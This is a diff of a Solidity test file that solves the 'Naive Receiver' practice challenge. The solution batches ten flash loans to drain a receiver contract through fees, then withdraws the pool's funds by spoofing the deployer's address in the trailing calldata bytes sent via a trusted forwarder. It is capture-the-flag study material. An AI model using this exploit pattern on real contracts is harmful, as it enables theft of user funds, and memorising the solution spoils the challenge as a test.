@@ -81,32 +81,42 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        // Prepare call data for 10 flashloans and 1 withdrawal
-        bytes[] memory callDatas = new bytes[](11); //an array of 11 items
+        /**
+         * We have to call the multicall with 11 calls to empty out the wETH user
+         */
+        bytes[] memory callDatas = new bytes[](11);
 
-        //Encode flashloan calls - on behalf of the Naive receiver. this is so we can drain the user
+        //Encode flash loan call - on behalf of the Naive receiver of the loan
         for (uint i = 0; i < 10; i++) {
             callDatas[i] = abi.encodeCall(
                 NaiveReceiverPool.flashLoan,
                 (receiver, address(weth), 1, "0x")
-            );
+            ); //We are filling the static array callDatas with the necessary encoded calls to call.
+            //function we want to call and the parameters to pass
         }
+        // Above are 10 calls pumped into callDatas
+        // The 11th call into callDatas, is the one to empty out the pool.
 
-        // Encode withdrawal call -> The 11th call
-        // Exploit the accesss control vulnerability by passing the request throug the forwarder.
-        // And setting the deployer as sender in the last 20 bytes(That's how the pool parses it)
+        //encoding the 11th call
         callDatas[10] = abi.encodePacked(
             abi.encodeCall(
                 NaiveReceiverPool.withdraw,
                 (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
             ),
-            bytes32(uint256(uint160(deployer)))// Multicall is processing bytes[] data only
+            bytes32(uint256(uint160(deployer)))
+            /*This is encoding the deployer address to the call to be passed to the basic forwarder.
+             *This is because we need to have the last 20 bytes equal to that of the deployer for impersonation.*/
         );
+        /**
+         * We are deploying and making the call on behalf of the deployer
+         */
 
-        //Encode the multicall
+        //Encode and ready for the multicall
         bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);
+        //pool.multicall because pool is multicall i.e. inherited into it this
 
-        //Create forwarder request
+        //Now we want to make sure the call goes through the basic forwarder
+        //Create the request for the forwarder
         BasicForwarder.Request memory request = BasicForwarder.Request(
             player,
             address(pool),
@@ -116,8 +126,12 @@ contract NaiveReceiverChallenge is Test {
             multicallData,
             1 days
         );
+        //Above it is BasicForwarder and not the initialized instance of the forwarder. This because of the reference to the imported version. The basic forwarder has to be a standing logic by itself.
+        /**
+         * forwarder.nonces(player), //This is like this because it needs call from the initialized instance
+         */
 
-        // Hash the request
+        //Now we create a requestHash
         bytes32 requestHash = keccak256(
             abi.encodePacked(
                 "\x19\x01",
@@ -126,11 +140,11 @@ contract NaiveReceiverChallenge is Test {
             )
         );
 
-        //Sign the request
-        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash); 
-        bytes memory signature = abi.encodePacked(r,s,v);
+        //Sign the requestHash
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
 
-        // Execute the request
+        // Execute request
         forwarder.execute(request, signature);
     }
 
